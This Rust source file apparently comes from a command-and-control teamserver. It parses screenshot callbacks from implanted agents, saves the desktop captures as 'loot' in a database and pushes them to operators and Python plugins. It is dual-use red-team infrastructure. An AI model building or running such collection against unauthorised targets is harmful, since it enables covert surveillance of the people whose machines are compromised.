use std::collections::BTreeMap;

use base64::Engine as _;
use base64::engine::general_purpose::STANDARD as BASE64_STANDARD;
use red_cell_common::demon::DemonCommand;
use serde_json::Value;
use time::OffsetDateTime;
use time::format_description::well_known::Rfc3339;
use tracing::warn;

use crate::{AgentRegistry, Database, EventBus, LootRecord, PluginRuntime};

use super::{
    CallbackParser, CommandDispatchError, agent_response_event, agent_response_event_with_extra,
    insert_loot_record, loot_context, loot_new_event, metadata_with_context,
};

pub(super) async fn handle_screenshot_callback(
    registry: &AgentRegistry,
    database: &Database,
    events: &EventBus,
    plugins: Option<&PluginRuntime>,
    agent_id: u32,
    request_id: u32,
    payload: &[u8],
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let mut parser = CallbackParser::new(payload, u32::from(DemonCommand::CommandScreenshot));
    let success = parser.read_u32("screenshot success")?;
    let context = loot_context(registry, agent_id, request_id).await;

    if success == 0 {
        events.broadcast(agent_response_event(
            agent_id,
            u32::from(DemonCommand::CommandScreenshot),
            request_id,
            "Error",
            "Failed to take a screenshot",
            None,
        )?);
        return Ok(None);
    }

    let bytes = parser.read_bytes("screenshot bytes")?;
    if bytes.is_empty() {
        events.broadcast(agent_response_event(
            agent_id,
            u32::from(DemonCommand::CommandScreenshot),
            request_id,
            "Error",
            "Failed to take a screenshot",
            None,
        )?);
        return Ok(None);
    }

    let timestamp = OffsetDateTime::now_utc();
    let captured_at = timestamp.format(&Rfc3339)?;
    let name = timestamp
        .format(
            &time::format_description::parse(
                "Desktop_[day].[month].[year]-[hour].[minute].[second].png",
            )
            .map_err(|error| CommandDispatchError::InvalidCallbackPayload {
                command_id: u32::from(DemonCommand::CommandScreenshot),
                message: error.to_string(),
            })?,
        )
        .map_err(CommandDispatchError::Timestamp)?;

    let record = insert_loot_record(
        database,
        LootRecord {
            id: None,
            agent_id,
            kind: "screenshot".to_owned(),
            name: name.clone(),
            file_path: None,
            size_bytes: Some(i64::try_from(bytes.len()).unwrap_or_default()),
            captured_at: captured_at.clone(),
            data: Some(bytes.clone()),
            metadata: Some(metadata_with_context(
                [
                    ("request_id".to_owned(), Value::String(format!("{request_id:X}"))),
                    ("captured_at".to_owned(), Value::String(captured_at.clone())),
                ]
                .into_iter(),
                &context,
            )),
        },
    )
    .await?;

    events.broadcast(loot_new_event(
        &record,
        u32::from(DemonCommand::CommandScreenshot),
        request_id,
        &context,
    )?);

    if let Some(plugins) = plugins
        && let Err(error) = plugins.emit_loot_captured(&record).await
    {
        warn!(agent_id = format_args!("{agent_id:08X}"), %error, "failed to emit python loot_captured event");
    }

    events.broadcast(agent_response_event_with_extra(
        agent_id,
        u32::from(DemonCommand::CommandScreenshot),
        request_id,
        "Good",
        "Successful took screenshot",
        BTreeMap::from([
            ("MiscType".to_owned(), Value::String("screenshot".to_owned())),
            ("MiscData".to_owned(), Value::String(BASE64_STANDARD.encode(&bytes))),
            ("MiscData2".to_owned(), Value::String(name)),
        ]),
        String::new(),
    )?);
    Ok(None)
}
